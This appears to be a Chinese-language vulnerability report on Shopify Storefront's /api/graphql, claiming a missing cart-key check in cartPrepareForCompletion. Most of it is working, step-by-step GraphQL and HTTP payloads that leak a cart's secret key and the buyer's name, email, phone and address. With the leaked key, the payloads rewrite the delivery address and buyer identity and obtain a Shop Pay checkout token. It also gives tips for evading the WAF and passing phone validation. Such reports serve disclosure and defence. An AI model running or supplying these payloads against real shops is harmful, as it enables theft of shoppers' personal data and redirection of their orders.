# Shopify Storefront /api/graphql ?key 校验不一致 → 裸 handle 读 PII / 写购物车

## 结论
`POST https://<shop>/api/graphql`（Shopify Storefront GraphQL，匿名可达）上存在两条不一致的访问控制路径：

| 入口 | ?key 是否校验 | 能拿到什么 |
|---|---|---|
| `cart(id: "gid://shopify/Cart/<handle>")` 查询 | 不校验，但**降级视图** | totalQuantity/cost/lines/countryCode/createdAt；`buyerIdentity.email` 恒为 `null`，无 checkoutUrl token |
| `cartPrepareForCompletion(cartId: "gid://shopify/Cart/<handle>")` mutation | **完全不校验** | `cart.id` 逐字回显真实 `?key=<32hex>`、`buyerIdentity.email/phone`、`delivery.addresses` 全字段、`note`、`attributes` |

拿到回显的 key 之后，可跨会话执行 `cartDeliveryAddressesUpdate`（收货改道）、`cartBuyerIdentityUpdate`（换买家邮箱/电话）、`cartNoteUpdate`（改备注），全部 `userErrors=[]` 并持久生效。`GET /cart/c/<handle>`（不带 key、不带 Cookie）还会 302 到 shop.app 结账并下发该车的 `shop_pay_token`。

**纠偏**：本店早期的结论「裸 handle 只能读购物车内容，email/PII 仍受 key 门禁，最高 low」只对 `cart(id:)` 成立；换成 `cartPrepareForCompletion` 后 key 校验整体缺失，可直接拿到 key + 全量 PII + 写权限，定级 high。

## 前提
1. 目标为 Shopify 托管店，Storefront API 匿名可达（`POST /api/graphql` 返回 `{"data":...}`）。
2. 已知目标购物车的 25 位 handle。handle 为 108bit 随机、不可枚举，必须有泄漏源：分享的 `/cart/c/<handle>` 链接、Referer、服务端日志、同设备未 HttpOnly 的 cart cookie、`ShopifyAnalytics.meta.cart.id`。
3. 无需账号、Cookie、key、Storefront token。

## 复现步骤

### 0. 取变体 id 与确认 mutation 存在
```http
GET /products.json?limit=1        -> products[0].variants[0].id
```
```http
POST /api/graphql
Content-Type: application/json

{"query":"{__type(name:\"Mutation\"){fields{name}}}"}
```
→ 200，字段清单包含 `cartPrepareForCompletion`（说明该店 Storefront schema 开放该 mutation）。

### 1. 自建对照车（受害侧基线）
```http
POST /api/graphql
Content-Type: application/json

{"query":"mutation Create($input:CartInput!){cartCreate(input:$input){cart{id} userErrors{message}}}",
 "variables":{"input":{
   "lines":[{"merchandiseId":"gid://shopify/ProductVariant/<VARIANT_ID>","quantity":1}],
   "buyerIdentity":{"email":"victim@example.com","phone":"+447911123456","countryCode":"GB"},
   "note":"victim-note"}}}
```
→ `cart.id = "gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>"`（正常业务访问必须带 key，这就是对照基线）。

### 2. 核心：裸 handle 调 prepare，一次拿 key + PII
```http
POST /api/graphql          （全新无 Cookie 会话）
Content-Type: application/json

{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} errors{code message}}} userErrors{field message code}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>"}}
```
→ 200 `CartStatusReady` 或 `CartStatusNotReady`，其中：
```json
{"cart":{"id":"gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>",
         "note":"victim-note",
         "buyerIdentity":{"email":"victim@example.com","phone":"+447911123456","countryCode":"GB"},
         "delivery":{"addresses":[{"id":"gid://shopify/CartSelectableAddress/<UUID>",
                                   "selected":true,
                                   "address":{"firstName":"Alice","lastName":"Victim",
                                              "address1":"12 Rose Lane","city":"London",
                                              "zip":"SW1A 1AA","countryCode":"GB",
                                              "phone":"+447911123456"}}]}}}
```

### 3. 决定性对照
```http
# a) 带错误 key —— 若 key 被校验应报错/返回 null
{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusNotReady{cart{id}} errors{code}}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>?key=deadbeefdeadbeefdeadbeefdeadbeef"}}
→ 与第 2 步（裸 handle）和第 2 步换成正确 key 的响应正文逐字节相同（md5 相等）

# b) 随机 handle 阴性对照
{"variables":{"cartId":"gid://shopify/Cart/AAAAAAAAAAAAAAAAAAAAAAAAA"}}
→ {"data":{"cartPrepareForCompletion":{"result":null}}}
```
md5 相等 = key 校验在 prepare 读路径**完全缺失**，不是缓存或巧合。

### 4. 用泄露的 key 写入（跨会话）
```http
POST /api/graphql
Content-Type: application/json

{"query":"mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} userErrors{field message code}}}",
 "variables":{"cartId":"gid://shopify/Cart/<HANDLE>?key=<REAL_KEY>",
              "addresses":[{"id":"<CartSelectableAddress_ID>",
                            "address":{"deliveryAddress":{
                              "firstName":"Verifier","lastName":"PWN",
                              "address1":"666 Redirect Lane","city":"Manchester",
                              "provinceCode":"ENG","zip":"M1 1AA",
                              "countryCode":"GB","phone":"+447911123456"}},
                            "selected":true}]}}
```
→ 200 `userErrors=[]`，地址被改写。

同法：
```
cartBuyerIdentityUpdate(cartId:"...?key=<REAL_KEY>", buyerIdentity:{email:"attacker@example.com", phone:"+447911123456", countryCode:"GB"})  -> userErrors=[]
cartNoteUpdate(cartId:"...?key=<REAL_KEY>", note:"pwned")                                                                                  -> userErrors=[]
```

### 5. 跨会话复核（证明持久）
再开**全新无 Cookie** 会话，仍只用裸 handle 调第 2 步 mutation →
`note`/`buyerIdentity.email`/`address` 全部为第 4 步写入值。

### 6. handle → 结账会话
```http
GET https://<shop>/cart/c/<HANDLE>        （无 key、无 Cookie）
```
→ `302 Location: https://shop.app/checkout/<...>/shoppay?...&shop_pay_token=eyJhbGciOiJIUzI1NiJ9...`，同时 `Set-Cookie: _shopify_essential=...; _shopify_analytics=...`。

## 判据
1. 第 2 步 `cart.id` 中出现真实 `?key=<32hex>`，且 email/phone/地址字段非空 —— 单条即成立。
2. 第 3a 步错误 key 与正确 key 的响应正文 md5 完全相同（决定性：若校验应为 null/错误）。
3. 第 3b 步随机 handle 返回 `result:null`（排除"对任何输入兜底"）。
4. 第 4 步 `userErrors=[]` + 第 5 步跨会话可见（证明写权限真实存在）。

## 失败常见原因
- `/api/graphql` 返回 401/403 或 HTML 页面：该店 Storefront token 未公开或被关闭（换 `/web/api/graphql.json`、`/api/{version}/graphql.json` 入口族试）。
- `cartId` 必须是 `gid://shopify/Cart/` 前缀 + 25 位 base62 handle；写成裸 25 位或 `/cart/<id>` 数字 id 都不行。
- 必须 `POST` + `Content-Type: application/json`；GET 不适用于 `/api/graphql`。
- phone 走 libphonenumber 校验：`+447700900xxx` 戏剧号段会被判 invalid，用 `+447911123456` 一类真实号段。
- 地址改写必须带第 2 步返回的 `CartSelectableAddress` id 且 `selected:true`，自己拼 id 会报 not found。
- 触发 WAF 时单线程、请求间隔 ≥3s。

## 边界与定级
- handle 108bit 随机，不可枚举；必须有泄漏源，因此影响面为"已泄漏 handle 的购物车"，定 high 而非 critical。
- 影响链：读 PII（姓名/地址/邮箱/电话/备注）→ 改收货地址（货改道）→ 改买家身份 → 拿到 shop_pay_token 进入该车结账会话。
- `cart(id:)` 读路径是降级视图（email 恒 null），不要把它当作"本店已修好"的证据；两个入口要分开测。
